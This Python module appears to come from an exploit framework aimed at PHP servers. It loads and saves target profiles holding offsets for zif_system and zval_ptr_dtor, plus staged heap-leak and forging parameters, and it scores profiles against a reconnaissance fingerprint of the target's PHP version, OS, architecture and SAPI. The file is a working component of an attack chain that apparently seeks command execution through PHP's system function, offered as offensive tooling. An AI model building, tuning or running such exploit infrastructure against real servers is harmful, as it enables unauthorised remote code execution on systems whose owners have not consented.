"""Profile database — offsets and stage parameters per PHP build.

Each profile is a JSON file in the profiles/ directory carrying zif_system
and zval_ptr_dtor symbol offsets, per-stage payload parameters, and
metadata. Profiles are auto-selected by matching the recon fingerprint
against loaded entries. Custom profiles may be added to the same directory
at runtime.
"""
from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass

from .branding import log


PROFILES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "profiles",
)


@dataclass
class Profile:
    name: str
    php_version: str
    os: str
    arch: str
    sapi: str
    zif_system: int
    zval_ptr_dtor: int
    memory_limit: str = "128M"
    status: str = "unverified"
    source_file: str = ""
    a1_big: int = 78
    a2_parts: int = 880
    a2_depth: int = 64
    a2_fillers: int = 115
    leak_fake_len: int = 0xC8000
    leak_spec: str = ""
    forge_vl: int = 384
    forge_n1: int = 500
    forge_n2: int = 495
    ht_offset: int = 0xF8398
    notes: str = ""


def _hex_or_int(v):
    if isinstance(v, str):
        return int(v, 16) if v.lower().startswith("0x") else int(v)
    return int(v)


def _load_profile_file(path: str) -> Profile:
    with open(path) as f:
        d = json.load(f)

    offsets = d.get("offsets", {})
    stages = d.get("stages", {})

    return Profile(
        name=d.get("name", os.path.basename(path)),
        php_version=d.get("php_version", ""),
        os=d.get("os", ""),
        arch=d.get("arch", "amd64"),
        sapi=d.get("sapi", "mod_php"),
        zif_system=_hex_or_int(offsets.get("zif_system", 0)),
        zval_ptr_dtor=_hex_or_int(offsets.get("zval_ptr_dtor", 0)),
        memory_limit=d.get("memory_limit", "128M"),
        status=d.get("status", "unverified"),
        source_file=path,
        a1_big=stages.get("a1_big", 78),
        a2_parts=stages.get("a2_parts", 880),
        a2_depth=stages.get("a2_depth", 64),
        a2_fillers=stages.get("a2_fillers", 115),
        leak_fake_len=_hex_or_int(stages.get("leak_fake_len", "0xC8000")),
        forge_vl=stages.get("forge_vl", 384),
        forge_n1=stages.get("forge_n1", 500),
        forge_n2=stages.get("forge_n2", 495),
        ht_offset=_hex_or_int(stages.get("ht_offset", "0xF8398")),
        notes=d.get("notes", ""),
    )


def _save_profile_file(profile: Profile, path: str) -> None:
    d = {
        "name": profile.name,
        "php_version": profile.php_version,
        "os": profile.os,
        "arch": profile.arch,
        "sapi": profile.sapi,
        "offsets": {
            "zif_system": f"0x{profile.zif_system:x}",
            "zval_ptr_dtor": f"0x{profile.zval_ptr_dtor:x}",
        },
        "stages": {
            "a1_big": profile.a1_big,
            "a2_parts": profile.a2_parts,
            "a2_depth": profile.a2_depth,
            "a2_fillers": profile.a2_fillers,
            "leak_fake_len": f"0x{profile.leak_fake_len:x}",
            "forge_vl": profile.forge_vl,
            "forge_n1": profile.forge_n1,
            "forge_n2": profile.forge_n2,
            "ht_offset": f"0x{profile.ht_offset:x}",
        },
        "memory_limit": profile.memory_limit,
        "status": profile.status,
        "notes": profile.notes,
    }
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(d, f, indent=2)
        f.write("\n")


def _sanitize_filename(name: str) -> str:
    safe = re.sub(r"[^A-Za-z0-9._-]+", "-", name).strip("-")
    return (safe or "profile") + ".json"


def _normalize_os(s: str) -> str:
    h = s.lower().strip()
    if "debian" in h:
        if "13" in h or "trixie" in h:
            return "debian-trixie"
        if "12" in h or "bookworm" in h:
            return "debian-bookworm"
        return "debian"
    if "ubuntu" in h:
        if "24" in h or "noble" in h:
            return "ubuntu-noble"
        if "22" in h or "jammy" in h:
            return "ubuntu-jammy"
        return "ubuntu"
    if "alpine" in h:
        return "alpine"
    if "rhel" in h or "red hat" in h or "centos" in h:
        return "rhel"
    return h


def _normalize_arch(s: str) -> str:
    a = s.lower().strip()
    if a in ("x86_64", "amd64", "x64"):
        return "amd64"
    if a in ("aarch64", "arm64"):
        return "arm64"
    return a


def _score_version(php_version: str, profile_version: str) -> int:
    if not php_version or not profile_version:
        return 0
    if php_version == profile_version:
        return 100
    pv = php_version.split(".")
    pp = profile_version.split(".")
    if len(pv) < 2 or len(pp) < 2:
        return 0
    if pv[:2] != pp[:2]:
        return 0
    if len(pv) >= 3 and len(pp) >= 3:
        try:
            diff = abs(int(pv[2]) - int(pp[2]))
        except ValueError:
            diff = 50
        return max(10, 40 - diff)
    return 20


class ProfileDB:
    def __init__(self, profiles_dir: str = PROFILES_DIR):
        self.profiles: list[Profile] = []
        self.profiles_dir = profiles_dir
        self._load_all()

    def _load_all(self) -> None:
        if not os.path.isdir(self.profiles_dir):
            log.debug(f"profiles dir missing: {self.profiles_dir}")
            return
        for fname in sorted(os.listdir(self.profiles_dir)):
            if not fname.endswith(".json"):
                continue
            path = os.path.join(self.profiles_dir, fname)
            try:
                profile = _load_profile_file(path)
                self.profiles.append(profile)
            except (json.JSONDecodeError, KeyError, ValueError) as exc:
                log.debug(f"skip profile {fname}: {exc}")

    def match(self, php_version: str = "", os_hint: str = "",
              arch: str = "", sapi: str = "",
              memory_limit: str = "") -> Profile | None:
        if not self.profiles:
            log.debug("profile database empty")
            return None

        os_norm = _normalize_os(os_hint)
        arch_norm = _normalize_arch(arch)

        scored: list[tuple[int, Profile]] = []
        for p in self.profiles:
            p_arch = _normalize_arch(p.arch)
            if arch_norm and p_arch != arch_norm:
                continue

            score = _score_version(php_version, p.php_version)

            p_os = _normalize_os(p.os)
            if os_norm and p_os == os_norm:
                score += 30
            elif os_norm and p_os and os_norm.split("-")[0] == p_os.split("-")[0]:
                score += 15

            if sapi and p.sapi and sapi.lower() in p.sapi.lower():
                score += 10

            if memory_limit and p.memory_limit == memory_limit:
                score += 5

            if p.status == "verified":
                score += 20

            if score > 0:
                scored.append((score, p))

        if not scored:
            log.debug(
                f"no profile matched "
                f"(version={php_version} os={os_norm} arch={arch_norm})"
            )
            return None

        scored.sort(key=lambda x: -x[0])
        best_score, best = scored[0]
        log.debug(f"best profile: {best.name} (score={best_score})")
        return best

    def add_profile(self, profile: Profile, save: bool = True) -> str:
        self.profiles.append(profile)
        if not save:
            return ""
        fname = _sanitize_filename(profile.name)
        path = os.path.join(self.profiles_dir, fname)
        _save_profile_file(profile, path)
        profile.source_file = path
        return path

    def list_profiles(self) -> list[Profile]:
        return sorted(self.profiles,
                      key=lambda p: (p.php_version, p.os))
